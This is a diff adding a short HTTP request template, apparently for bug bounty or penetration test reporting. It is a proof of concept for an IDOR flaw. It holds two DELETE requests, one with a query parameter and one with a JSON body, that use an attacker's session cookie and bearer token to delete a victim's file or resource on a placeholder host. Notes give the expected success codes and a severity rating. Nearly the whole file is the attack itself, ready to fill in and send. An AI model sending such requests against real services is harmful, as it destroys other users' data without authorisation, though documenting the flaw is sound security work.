@@ -1,0 +1,29 @@
+### IDOR PoC — DELETE Request
+### Save this as: delete_idor_ENDPOINT.http
+
+DELETE /api/files/delete?file_id=VICTIM_FILE_ID HTTP/1.1
+Host: target.example.com
+Accept: application/json
+Cookie: session=ATTACKER_SESSION_TOKEN
+Authorization: Bearer ATTACKER_TOKEN
+
+---
+### Expected: Victim's file/resource is deleted using attacker's session (200 or 204)
+### Proof: Log in as victim and confirm resource no longer exists
+
+---
+
+### IDOR PoC — DELETE via JSON body (alternative)
+
+DELETE /api/resource HTTP/1.1
+Host: target.example.com
+Content-Type: application/json
+Cookie: session=ATTACKER_SESSION_TOKEN
+Authorization: Bearer ATTACKER_TOKEN
+
+{
+  "resource_id": "VICTIM_RESOURCE_ID"
+}
+
+---
+### Severity: High–Critical (data destruction, potential DoS on victim account)
